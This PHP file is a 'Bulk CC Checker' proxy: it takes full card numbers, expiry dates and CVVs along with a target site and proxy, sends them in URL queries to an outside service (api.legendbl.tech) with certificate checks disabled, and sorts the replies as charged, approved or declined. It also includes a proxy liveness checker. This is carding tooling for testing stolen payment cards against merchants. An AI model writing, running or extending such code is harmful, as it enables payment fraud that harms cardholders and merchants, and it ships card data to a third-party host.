<?php
/**
 * Bulk CC Checker API Proxy
 * Handles external API requests to avoid CORS issues
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

// Get POST data
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data || !isset($data['action'])) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid request']);
    exit;
}

$action = $data['action'];

// Handle different actions
switch ($action) {
    case 'check_card':
        handleCheckCard($data);
        break;
    
    case 'validate_proxy':
        handleValidateProxy($data);
        break;
    
    default:
        http_response_code(400);
        echo json_encode(['error' => 'Unknown action']);
        exit;
}

/**
 * Handle card checking
 */
function handleCheckCard($data) {
    $cc = $data['cc'] ?? '';
    $mes = $data['mes'] ?? '';
    $ano = $data['ano'] ?? '';
    $cvv = $data['cvv'] ?? '';
    $site = $data['site'] ?? '';
    $proxy = $data['proxy'] ?? '';
    
    if (empty($cc) || empty($mes) || empty($ano) || empty($cvv) || empty($site)) {
        http_response_code(400);
        echo json_encode(['error' => 'Missing required parameters']);
        return;
    }
    
    // Build API URL
    $apiUrl = 'https://api.legendbl.tech/autossh.php?cc=' . urlencode($cc . '|' . $mes . '|' . $ano . '|' . $cvv) 
              . '&site=' . urlencode($site) 
              . '&proxy=' . urlencode($proxy);
    
    // Make request with timeout
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    // Add headers
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept: */*'
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    if ($error || $httpCode !== 200) {
        echo json_encode([
            'success' => false,
            'error' => $error ?: 'API request failed',
            'http_code' => $httpCode,
            'response' => $response
        ]);
        return;
    }
    
    // Parse response
    $result = parseCheckResponse($response);
    
    echo json_encode([
        'success' => true,
        'result' => $result,
        'raw_response' => $response
    ]);
}

/**
 * Handle proxy validation
 */
function handleValidateProxy($data) {
    $proxy = $data['proxy'] ?? '';
    $site = $data['site'] ?? 'https://google.com';
    
    if (empty($proxy)) {
        http_response_code(400);
        echo json_encode(['error' => 'Proxy is required']);
        return;
    }
    
    // Build API URL
    $apiUrl = 'https://api.legendbl.tech/autog.php?site=' . urlencode($site) 
              . '&proxy=' . urlencode($proxy);
    
    // Make request with shorter timeout for proxy validation
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    // Determine if proxy is live
    $isLive = false;
    if ($httpCode === 200 && !$error) {
        $responseLower = strtolower($response);
        $isLive = (strpos($responseLower, 'success') !== false) || 
                  (strpos($responseLower, 'error') === false && strpos($responseLower, 'failed') === false);
    }
    
    echo json_encode([
        'success' => true,
        'is_live' => $isLive,
        'response' => $response,
        'http_code' => $httpCode
    ]);
}

/**
 * Parse check response
 */
function parseCheckResponse($response) {
    $responseLower = strtolower($response);
    
    $status = 'declined';
    $message = $response;
    
    // Check for charged
    if (strpos($responseLower, 'charged') !== false) {
        $status = 'charged';
    }
    // Check for approved variations
    elseif (strpos($responseLower, 'approved') !== false || 
            strpos($responseLower, 'live') !== false ||
            strpos($responseLower, 'cvv') !== false ||
            strpos($responseLower, '3ds') !== false ||
            strpos($responseLower, 'risky') !== false) {
        $status = 'approved';
    }
    
    return [
        'status' => $status,
        'message' => substr($message, 0, 200), // Limit message length
        'full_response' => $response
    ];
}
